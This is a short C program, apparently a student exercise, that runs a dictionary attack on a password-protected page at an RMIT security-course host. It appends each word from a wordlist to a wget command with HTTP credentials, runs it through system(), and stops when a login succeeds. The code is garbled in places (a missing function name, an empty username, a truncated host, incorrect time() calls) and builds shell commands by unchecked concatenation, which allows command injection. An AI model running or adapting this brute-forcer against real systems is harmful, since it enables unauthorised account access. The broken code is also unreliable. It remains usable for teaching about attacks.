

#include <stdio.h>
#include <string.h>
#include <sys/time.h>
#define OneBillion 1e9


int () {
 FILE *fp;
 int ret;
 char *strin = "wget http://sec-crack.cs.rmit.edu./SEC/2/ --http-user= --http-passwd=";
 char str[100];
 char passwd[150];
 int startTime, stopTime, final;
 strcpy(passwd,strin);
 fp = fopen("words","r");
 
 if (fp == NULL) {
    printf ("\n Error opening file; exiting...");
    exit(0); 
 }

 else 
 startTime = time();
while (fgets(str,20,fp) != NULL) {
         str[strlen(str)-1] = '\0';
         if (strlen(str) < 4) {
            strcat(passwd,str);
            printf("string is %s\n",passwd);
            ret = system(passwd);
            strcpy(passwd,strin);
            if (ret == 0) break;
         }
 }
 stopTime = time();
   final = stopTime-startTime;
       printf("\n============================================================");
       printf("\n HostName : http://sec-crack.cs.rmit.edu./SEC/2/index.html");
       printf("\n UserName : ");
       printf("\n Password : %s\n",str);
       printf("The program took %lld nanoseconds (%lf) seconds \n", final,  (double)final/OneBillion );   
       printf("\n============================================================");
}
